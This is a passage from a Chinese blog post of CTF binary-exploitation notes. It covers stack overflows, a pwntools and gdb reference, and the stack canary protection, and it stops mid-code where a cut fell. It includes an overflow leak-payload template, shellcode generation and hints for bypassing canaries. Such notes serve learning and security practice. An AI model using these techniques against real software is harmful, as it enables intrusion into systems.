    <content type="html"><![CDATA[<h2 id="部分理论基础-Linux"><a href="#部分理论基础-Linux" class="headerlink" title="部分理论基础(Linux)"></a>部分理论基础(Linux)</h2><h3 id="栈的机制"><a href="#栈的机制" class="headerlink" title="栈的机制"></a>栈的机制</h3><p>栈是程序运行所使用的一种先进后出后进先出的线性表。大概是这样：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200330165641.png" alt="20200330165641"><br>可以看到，就好比向一个单开口的箱子中压书一样（注意：就只是平着压入！！！<del>别在那想为啥不竖着放，这样就可以想拿那个出去就拿那个出去</del>）最先压入的A如果想要拿出来必须从最上面一个个拿出来，最后才能拿出来A，即：先进后出，后进先出。<br>栈通常用来为程序运行时所调用的各种函数存放其所使用的<code>参数/变量</code>。使用时一般是这样的（每使用一个函数，在调用这个函数时就会用这个模板为函数开辟一块栈帧）：</p><table><thead><tr><th align="center"></th><th align="left"></th></tr></thead><tbody><tr><td align="center">···</td><td align="left">···</td></tr><tr><td align="center">ESP</td><td align="left">栈顶</td></tr><tr><td align="center">Local variable</td><td align="left">局部变量</td></tr><tr><td align="center">EBP</td><td align="left">栈底</td></tr><tr><td align="center">retaddr</td><td align="left">返回地址</td></tr><tr><td align="center">Incoming parameters</td><td align="left">传入参数</td></tr><tr><td align="center"><strong>···</strong></td><td align="left">···</td></tr></tbody></table><p>当一个程序运行时需要获取输入时，这个存放输入的变量对于程序而言一般都放在局部变量中（一般是局部变量，不排除别的情况）。这时候看上面的栈帧模板就会发现，如果没有严格控制输入，那么就有可能会产生因为输入过长而导致输入的数据覆盖栈底、返回地址、传入参数······这是输入数据直接存放在栈内局部变量的情况；同理，即使输入数据没有存放在栈帧中，同样也会出现其它的数据覆盖现象，无论是什么数据被覆盖，都有可能会影响到程序的正常执行，从而导致各种可能产生的后果，也正是这样才导致了pwn的出现。<br>如最简单的栈溢出就是通过覆盖函数返回地址来达成目的。</p><p>详细的栈的介绍可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/" target="_blank" rel="noopener">ctf-wiki中的栈介绍</a></p><p>这里记录一些常见的可导致溢出的危险函数：</p><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>还未学习，暂空</p><h2 id="工具的一些使用记录"><a href="#工具的一些使用记录" class="headerlink" title="工具的一些使用记录"></a>工具的一些使用记录</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="模块列表"><a href="#模块列表" class="headerlink" title="模块列表"></a>模块列表</h4><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">adb：安卓调试桥</span><br><span class="line">args：命令行魔法参数</span><br><span class="line">asm：汇编和反汇编，支持 i386/i686/amd64/thumb 等</span><br><span class="line">constants：对不同架构和操作系统的常量的快速访问</span><br><span class="line">config：配置文件</span><br><span class="line">context：设置运行时变量</span><br><span class="line">dynelf：用于远程函数泄露</span><br><span class="line">encoders：对 shellcode 进行编码</span><br><span class="line">elf：用于操作 ELF 可执行文件和库</span><br><span class="line">flag：提交 flag 到服务器</span><br><span class="line">fmtstr：格式化字符串利用工具</span><br><span class="line">gdb：与 gdb 配合使用</span><br><span class="line">libcdb：libc 数据库</span><br><span class="line">log：日志记录</span><br><span class="line">memleak：用于内存泄露</span><br><span class="line">rop：ROP 利用模块，包括 rop 和 srop</span><br><span class="line">runner：运行 shellcode</span><br><span class="line">shellcraft：shellcode 生成器</span><br><span class="line">term：终端处理</span><br><span class="line">timeout：超时处理</span><br><span class="line">tubes：能与 sockets, processes, ssh 等进行连接</span><br><span class="line">useragents：useragent 字符串数据库</span><br><span class="line">util：一些实用小工具</span><br><span class="line">pwnlib.atexception — Callbacks on unhandled exception</span><br><span class="line">pwnlib.atexit — Replacement <span class="keyword">for</span> atexit</span><br><span class="line">pwnlib.exception — Pwnlib exceptions</span><br><span class="line">pwnlib.replacements — Replacements <span class="keyword">for</span> various functions</span><br><span class="line">pwnlib.util.crc — Calculating CRC-sums</span><br><span class="line">pwnlib.util.cyclic — Generation of unique sequences</span><br><span class="line">pwnlib.util.fiddling — Utilities bit fiddling</span><br><span class="line">pwnlib.util.hashes — Hashing functions</span><br><span class="line">pwnlib.util.iters — Extension of standard module itertools</span><br><span class="line">pwnlib.util.lists — Operations on lists</span><br><span class="line">pwnlib.util.misc — We could not fit it any other place</span><br><span class="line">pwnlib.util.net — Networking interfaces</span><br><span class="line">pwnlib.util.packing — Packing and unpacking of strings</span><br><span class="line">pwnlib.util.proc — Working with /proc/</span><br><span class="line">pwnlib.util.safeeval — Safe evaluation of python code</span><br><span class="line">pwnlib.util.web — Utilities <span class="keyword">for</span> working with the WWW</span><br></pre></td></tr></table></figure><h4 id="常用模块和功能"><a href="#常用模块和功能" class="headerlink" title="常用模块和功能"></a>常用模块和功能</h4><h5 id="context"><a href="#context" class="headerlink" title="context"></a>context</h5><p>设置程序运行时的参数，如程序运行在什么系统什么处理器下。一般只设置三个参数：</p><blockquote><p>context(os = ‘linux’ , arch = ‘i386’ , log_level = ‘debug’)<br>或<br>context(os = ‘linux’ , arch = ‘amd64’ , log_level = ‘debug’)</p></blockquote><h5 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h5><p>用于生成汇编指令对应的机器码</p><blockquote><p>asm(‘mov eax,0’)<br>‘\xb8\x00\x00\x00\x00’</p></blockquote><p>也可以查看机器码对应的汇编指令</p><blockquote><p>disasm(“\xb8\x00\x00\x00\x00”)<br>‘mov eax,0’</p></blockquote><p>不过之前好像看到有人说这东东有缺陷，推荐最好还是用<code>keystone-engine</code></p><h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h5><p>一般就用个附加调试</p><blockquote><p>s = process(‘./pwnme’)<br>context.terminal = [‘gnome-terminal’, ‘-x’, ‘sh’, ‘-c’]<br>gdb.attach( proc.pidof(s) [0])</p></blockquote><p>可以在attch的时候指定要gdb运行的指令：</p><blockquote><p>gdb.attach(proc.pidof(s) [0], gdbscript=’b *0x400620\nc\n’)</p></blockquote><p>个人喜欢直接终端：gdb -P pid（process之后返回的pid）</p><h5 id="shellcraft"><a href="#shellcraft" class="headerlink" title="shellcraft"></a>shellcraft</h5><p>生成一些简单的shellcode，推荐先设置好context再用，一般直接输出shellcode内容</p><blockquote><p>print(shellcraft.sh())<br>不过这里是直接提供的汇编指令，需要将其转为机器码<br>print(asm(shellcraft.sh()))</p></blockquote><h5 id="packing"><a href="#packing" class="headerlink" title="packing"></a>packing</h5><p>用来打包数据或者解包数据</p><ul><li>打包——p32/p64(打包为32位或64位的数据)</li></ul><blockquote><p>p32(0x400010,endian = ‘big’) #设置数据为大端存储，默认为小端</p></blockquote><ul><li>解包——u32/u64</li></ul><h5 id="tubes"><a href="#tubes" class="headerlink" title="tubes"></a>tubes</h5><p>对于一次攻击而言前提就是与目标服务器或者程序进行交互，这里就可以使用remote(address, port)产生一个远程的socket然后就可以读写了</p><blockquote><p>sh = remote(‘ftp.debian.org’,21)<br>sh.recvline()<br>‘220 …’<br>sh.send(‘USER anonymous\r\n’)<br>sh.recvuntil(‘ ‘, drop=True)<br>‘331’<br>sh.recvline()<br>‘Please specify the password.\r\n’<br>sh.close()</p></blockquote><p>使用process可以打开一个本地程序并进行交互</p><blockquote><p>sh = process(‘/bin/sh’)<br>sh.sendline(‘sleep 3; echo hello world;’)<br>sh.recvline(timeout=1)<br>‘’<br>sh.recvline(timeout=5)<br>‘hello world\n’<br>sh.close()</p></blockquote><p>使用listen来开启一个本地的监听端口</p><blockquote><p>l = listen()<br>r = remote(‘localhost’, l.lport)<br>c = l.wait_for_connection()<br>r.send(‘hello’)<br>c.recv()<br>‘hello’</p></blockquote><p>用于交互时读写的函数</p><blockquote><p>interactive() : 直接进行交互，相当于回到shell的模式，在取得shell之后使用<br>recv(numb=4096, timeout=default) : 接收指定字节<br>recvall() : 一直接收直到EOF<br>recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\n<br>recvuntil(delims, drop=False) : 一直读到delims的pattern出现为止<br>recvrepeat(timeout=default) : 持续接受直到EOF或timeout<br>send(data) : 发送数据<br>sendline(data) : 发送一行数据，相当于在数据末尾加\n</p></blockquote><h5 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h5><p>elf模块提供了一种便捷的方法能够迅速的得到文件内函数的地址，plt位置以及got表的位置。</p><blockquote><p>e = ELF(‘./libc.so’)<br>print hex(e.address)  # 文件装载的基地址<br>0x400000<br>print hex(e.symbols[‘write’]) # 函数地址<br>0x401680<br>print hex(e.got[‘write’]) # GOT表的地址<br>0x60b070<br>print hex(e.plt[‘write’]) # PLT的地址<br>0x401680<br>print hex(e.search(‘/bin/sh’).next())# 字符串/bin/sh的地址</p></blockquote><p>ELF模块下的一些功能</p><ul><li>asm(address, assembly) : 在指定地址进行汇编</li><li>bss(offset) : 返回bss段的位置，offset是偏移值</li><li>checksec() : 对elf进行一些安全保护检查，例如NX, PIE等。</li><li>disasm(address, n_bytes) : 在指定位置进行n_bytes个字节的反汇编</li><li>offset_to_vaddr(offset) : 将文件中的偏移offset转换成虚拟地址VMA</li><li>vaddr_to_offset(address) : 与上面的函数作用相反</li><li>read(address, count) : 在address(VMA)位置读取count个字节</li><li>write(address, data) : 在address(VMA)位置写入data</li><li>section(name) : dump出指定section的数据</li></ul><h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>pwntools中的ROP模块可以实现简单的ROP链的操作，就是自动地寻找程序里的gadget，自动在栈上部署对应的参数。</p><blockquote><p>elf = ELF(‘ropasaurusrex’)<br>rop = ROP(elf)<br>rop.read(0, elf.bss(0x80))<br>rop.dump()<br># [‘0x0000:        0x80482fc (read)’,<br>#  ‘0x0004:       0xdeadbeef’,<br>#  ‘0x0008:              0x0’,<br>#  ‘0x000c:        0x80496a8’]<br>str(rop)<br># &gt; ‘\xfc\x82\x04\x08\xef\xbe\xad\xde\x00\x00\x00\x00\xa8\x96\x04\x08’</p></blockquote><p>使用ROP(elf)来产生一个rop的对象，这时的ROP链还是空的，需要在其中添加函数。</p><p>因为ROP对象实现了<code>__getattr__</code>的功能，可以直接通过<code>func call</code>的形式来添加函数，<code>rop.read(0, elf.bss(0x80))</code>实际相当于<code>rop.call(&#39;read&#39;, (0, elf.bss(0x80)))</code>。 通过多次添加函数调用，最后使用<code>str</code>将整个<code>rop chain dump</code>出来就可以了。</p><ul><li>call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号)</li><li>chain() : 返回当前的字节序列，即payload</li><li>dump() : 直观地展示出当前的rop chain</li><li>raw() : 在rop chain中加上一个整数或字符串</li><li>search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget，没仔细研究过</li><li>unresolve(value) : 给出一个地址，反解析出符号</li></ul><p>ROP的工作还是推荐通过<code>ROPgadget</code>来进行，pwntools的<code>ROP</code>功能之前貌似看到说是不完善，只能进行相对简单的<code>ROP</code>构造</p><h5 id="DynELF-符号泄露"><a href="#DynELF-符号泄露" class="headerlink" title="DynELF 符号泄露"></a>DynELF 符号泄露</h5><p>给出一个函数句柄，可以解析任意符号的位置。这个函数的功能是：输入任意一个address，输出这个address中的data(至少1byte)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./pwnme'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * OverLength + write_addr + p64(<span class="number">0xdeadbeaf</span>) + p64(<span class="number">1</span>) + p64(address) + p64(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">"%#x =&gt;  %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line">d.lookup(<span class="literal">None</span>, <span class="string">'libc'</span>)      <span class="comment"># libc基址</span></span><br><span class="line">d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定一份elf的副本可以加速查找过程</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">'./pwnme'</span>))</span><br><span class="line">d.lookup(<span class="literal">None</span>, <span class="string">'libc'</span>)</span><br><span class="line">d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure><p>在应用中我们可以在<code>leak</code>函数中布置<code>rop</code>链，使用<code>write</code>函数<code>leak</code>出一个<code>address</code>的地址和数据，然后返回。接着就可以使用<code>d.lookup</code>函数查找符号了，通常我们都是需要找<code>system</code>的符号。</p><h3 id="gdb-some"><a href="#gdb-some" class="headerlink" title="gdb(some)"></a>gdb(some)</h3><h4 id="list-l-命令"><a href="#list-l-命令" class="headerlink" title="list/l 命令"></a>list/l 命令</h4><p>可以使用list/l命令查看程序，方便我们添加断点时查看信息。</p><blockquote><p>list+lineNumber(中间有空格)<br>list 打印函数名称为Function的函数上下文的源程序<br>list 输出当前行后面的代码<br>list -显示当前行前面的代码</p></blockquote><h4 id="run-r命令"><a href="#run-r命令" class="headerlink" title="run/r命令"></a>run/r命令</h4><p>  在gdb中运行程序使用run命令.也可以设置程序运行参数。pwd命令用于显示当前所在目录。</p><h4 id="break-b命令"><a href="#break-b命令" class="headerlink" title="break/b命令"></a>break/b命令</h4><blockquote><p>break &lt; function &gt;           在进入指定的函数function时既停止运行，C++中可以使用class::function或function(type, type)格式来指定函数名称<br>break &lt; lineNumber&gt;          在指定的代码行打断点<br>break +offset/break -offset   在当前行的前面或后面的offset行打断点，offset为自然数<br>break filename:lineNumber     在名称为filename的文件中的第lineNumber行打断点<br>break filename:function       在名称为filename的文件中的function函数入口处打断点<br>break *address                在程序运行的内存地址处打断点<br>break                         在下一条命令处停止运行<br>break … if &lt; condition&gt;        在处理某些循环体中可使用此方法进行调试，其中…可以是上述的break lineNumber、break +offset/break -offset中的参数，其中condition表示条件，在条件成立时程序即停止运行，如设置break if i=100表示当i为100时程序停止运行。查看断点时，也可以使用info命令如info breakpoints [n]、info break [n]其中n 表示断点号来查看断点信息。</p></blockquote><h4 id="逐步调试命令"><a href="#逐步调试命令" class="headerlink" title="逐步调试命令"></a>逐步调试命令</h4><blockquote><p>next &lt; count&gt;。单步跟踪，如果有函数调用不会进入函数，如果后面不加count表示一条一条的执行，加count表示执行后面的count条指令，<br>s/step &lt; count&gt;。单步跟踪，如果有函数调用则进入该函数（进入该函数前提是此函数编译有Debug信息）,与next类似，其不加count表示一条一条执行，加上count表示自当前行开始执行count条代码指令<br>set step-mode.set step-mode on用于打开step-mode模式，这样在进行单步跟踪时，程序不会因为没有debug信息而不停止运行，这很有利于查看机器码，可以通过set step-mode off关闭step-mode模式<br>finish。运行程序直到当前函数完成并打印函数返回时的堆栈地址和返回值及参数值等信息。<br>until。运行程序直到退出循环体<br>stepi(缩写si)和nexti(缩写ni)。stepi和nexti用于单步跟踪一条及其指令，一条程序代码有可能由数条机器指令完成，stepi和nexi可以单步执行机器指令。</p></blockquote><h4 id="continue-c命令"><a href="#continue-c命令" class="headerlink" title="continue/c命令"></a>continue/c命令</h4><p>当程序遇到断点停止运行后可以使用continue命令恢复程序的运行到下一个断点或直到程序结束。</p><h4 id="print命令"><a href="#print命令" class="headerlink" title="print命令"></a>print命令</h4><p>请查看：<a href="https://blog.csdn.net/linuxheik/article/details/17380767" target="_blank" rel="noopener">https://blog.csdn.net/linuxheik/article/details/17380767</a></p><h4 id="watch命令"><a href="#watch命令" class="headerlink" title="watch命令"></a>watch命令</h4><p>watch命令一般来观察某个表达式(变量也可视为一种表达式)的值是否发生了变化，如果由变化则程序立即停止运行，其具体用法如下：</p><blockquote><p>watch &lt; expr&gt;      为表达式(变量)expr设置一个观察点一旦其数值由变化，程序立即停止运行<br>rwatch &lt; expr&gt;      当表达式expr被读时，程序立即停止运行<br>awatch &lt; expr&gt;      当表达式expr的值被读或被写时程序立即停止运行<br>info watchpoints     列出当前所设置的所有观察点</p></blockquote><h4 id="return命令"><a href="#return命令" class="headerlink" title="return命令"></a>return命令</h4><p>如果在函数中设置了调试断点，在断点后还有语句没有执行完，这个时候我们可以使用return命令强制函数忽略还没有执行的语句并返回。可以直接使用return命令用于取消当前函数的执行并立即返回函数值，也可以指定表达式如 return &lt; expression&gt;那么该表达式的值会被作为函数的返回值。</p><h4 id="info命令"><a href="#info命令" class="headerlink" title="info命令"></a>info命令</h4><p>info命令可以用来在调试时查看寄存器、断点、观察点和信号等信息。其用法如下：</p><blockquote><p>info registers:查看除了浮点寄存器以外的寄存器<br>info all-registers: 查看所有的寄存器包括浮点寄存器<br>info registers &lt; registersName&gt;:查看指定寄存器<br>info break: 查看所有断点信息<br>info watchpoints: 查看当前设置的所有观察点<br>info signals info handle: 查看有哪些信号正在被gdb检测<br>info line: 查看源代码在内存中的地址<br>info threads: 可以查看多线程</p></blockquote><h4 id="finish命令"><a href="#finish命令" class="headerlink" title="finish命令"></a>finish命令</h4><p>执行完当前的函数。</p><p>run(缩写r)和quit(缩写q)分别可以开始运行程序和退出gdb调试</p><p>whatis或ptype显示变量的类型</p><p>bt显示函数调用路径</p><h4 id="x命令"><a href="#x命令" class="headerlink" title="x命令"></a>x命令</h4><p>x/&lt; n/f/u &gt; &lt; addr &gt;</p><p>n、f、u是可选的参数。</p><p>n是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。<br>f 表示显示的格式。如果地址所指的是字符串，那么格式可以是s，如果 地址是指令地址，那么格式可以是i。<br>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字 节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p><p>&lt; addr &gt; 表示一个内存地址。<br>n/f/u三个参数可以一起使用。例如：</p><blockquote><p>x/3uh 0x54320 表示，从内存地址0x54320读取内容，h表示以双字节为一个单位，3表示三个单位，u表示按十六进制显示。</p></blockquote><p>输出格式:<br>一般来说，GDB会根据变量的类型输出变量的值。但你也可以自定义GDB的输出的格式。例如，你想输出一个整数的十六进制，或是二进制来查看这个整型变量的中的位的情况。要做到这样，你可以使用GDB的数据显示格式：</p><blockquote><p>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。</p></blockquote><h4 id="简单的汇总"><a href="#简单的汇总" class="headerlink" title="简单的汇总"></a>简单的汇总</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">start                       <span class="comment">#开始调试,停在第一行代码处,(gdb)start</span></span><br><span class="line">l                           <span class="comment">#list的缩写查看源代码,(gdb) l [number/function]</span></span><br><span class="line">b &lt;lines&gt;                   <span class="comment">#b: Breakpoint的简写，设置断点。(gdb) b 10</span></span><br><span class="line">b &lt;func&gt;                    <span class="comment">#b: Breakpoint的简写，设置断点。(gdb) b main</span></span><br><span class="line">b filename:[line/<span class="keyword">function</span>]  <span class="comment">#b:在文件filename的某行或某个函数处设置断点</span></span><br><span class="line">i breakpoints               <span class="comment">#i:info 的简写。(gdb)i breakpoints</span></span><br><span class="line">d [bpNO]                    <span class="comment">#d: Delete breakpoint的简写，删除指定编号的某个断点，或删除所有断点。断点编号从1开始递增。 (gdb)d 1</span></span><br><span class="line">s                           <span class="comment">#s: step执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；(gdb) s</span></span><br><span class="line">n                           <span class="comment">#n: next执行一行源程序代码，此行代码中的函数调用也一并执行。(gdb) n</span></span><br><span class="line">r                           <span class="comment">#Run的简写，运行被调试的程序。如果此前没有下过断点，则执行完整个程序；如果有断点，则程序暂停在第一个可用断点处。(gdb) r</span></span><br><span class="line">c                           <span class="comment">#Continue的简写，继续执行被调试程序，直至下一个断点或程序结束。(gdb) c</span></span><br><span class="line">finish                      <span class="comment">#函数结束</span></span><br><span class="line">p [var]                     <span class="comment">#Print的简写，显示指定变量（临时变量或全局变量 例如 int a）的值。(gdb) p a</span></span><br><span class="line">display [var]               <span class="comment">#display，设置想要跟踪的变量(例如 int a)。(gdb) display a</span></span><br><span class="line">undisplay [varnum]          <span class="comment">#undisplay取消对变量的跟踪，被跟踪变量用整型数标识。(gdb) undisplay 1</span></span><br><span class="line"><span class="built_in">set</span> args                    <span class="comment">#可指定运行时参数。(gdb)set args 10 20  args可以是内存中某个地址</span></span><br><span class="line">show args                   <span class="comment">#查看运行时参数。</span></span><br><span class="line">x/&lt;n/f/u&gt; addr              <span class="comment">#查看内存中的值，n为数量，f为输出格式，u为值类型</span></span><br><span class="line">q                           <span class="comment">#Quit的简写，退出GDB调试环境。(gdb) q</span></span><br><span class="line"><span class="built_in">help</span> [cmd]                  <span class="comment">#GDB帮助命令，提供对GDB名种命令的解释说明。如果指定了“命令名称”参数，则显示该命令的详细说明；如果没有指定参数，则分类显示所有GDB命令，供用户进一步浏览和查询。(gdb)help</span></span><br><span class="line">回车                        <span class="comment">#重复前面的命令，(gdb)回车</span></span><br></pre></td></tr></table></figure><h2 id="程序的保护机制"><a href="#程序的保护机制" class="headerlink" title="程序的保护机制"></a>程序的保护机制</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>该保护开启的程序运行时会在开辟的栈帧上设置一个可当作<code>令牌</code>一样的随机值，程序在运行过程中会对该值进行校验，一旦校验时发现该值被改变则立即停止程序运行。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>开启Canary保护的程序在开辟栈帧时的结构如下：</p><blockquote><pre><code>  High  Address |                 |          +-----------------+          | args            |          +-----------------+          | return address  |          +-----------------+  rbp =&gt;  | old ebp         |          +-----------------+rbp-8 =&gt;  | canary value    |          +-----------------+          | 局部变量        |  Low     |                 |  Address</code></pre></blockquote><p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eglibc-2.19&#x2F;debug&#x2F;stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  &#x2F;* The loop is added only to keep gcc happy.  *&#x2F;</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 <strong>__stack_chk_fail</strong> 的 <strong>got</strong> 值劫持流程或者利用 <strong>__stack_chk_fail</strong> 泄漏内容 (参见 stack smash)。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  